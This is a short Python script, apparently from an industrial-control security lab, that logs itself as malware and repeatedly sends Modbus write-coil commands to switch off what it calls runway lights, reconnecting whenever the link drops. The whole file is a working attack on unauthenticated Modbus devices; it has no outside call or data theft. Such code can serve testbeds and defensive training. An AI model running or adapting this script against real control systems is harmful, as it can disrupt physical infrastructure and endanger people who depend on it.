import logging
# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,  # Set the logging level
    format='%(asctime)s - [MAL] - %(levelname)s: %(message)s',  # Custom format
    datefmt='%H:%M:%S'  # Display only hour, minute, and second
)
log = logging.getLogger("MAL")  # Create a custom logger

import pymodbus.exceptions
from pymodbus.client import ModbusTcpClient
import time
from ics.constants import ICS_SERVER_PORT, ICS_SERVER_IP

REQUEST_FREQUENCY = 3  # Frequency of requests in seconds
RETRY_DELAY = 10  # Delay in seconds before retrying connection

def loop_modbus_request(client):
    while True:
        try:
            # Write 0 (OFF) to coil at address 0
            log.debug("Sending turn off signal to ics runway lights")
            client.write_coil(0, False)
        except pymodbus.exceptions.ConnectionException as e:
            # pymodbus already logs connection errors
            time.sleep(RETRY_DELAY)
            client.connect()
        # Small delay to prevent overwhelming the server
        time.sleep(REQUEST_FREQUENCY)

if __name__ == "__main__":
    try:
        log.info("Running malware...")
        # Create a Modbus TCP client
        client = ModbusTcpClient(ICS_SERVER_IP, port=ICS_SERVER_PORT) 
        client.connect()
        loop_modbus_request(client)
    except KeyboardInterrupt:
        log.info("Script stopped by user")
    finally:
        client.close()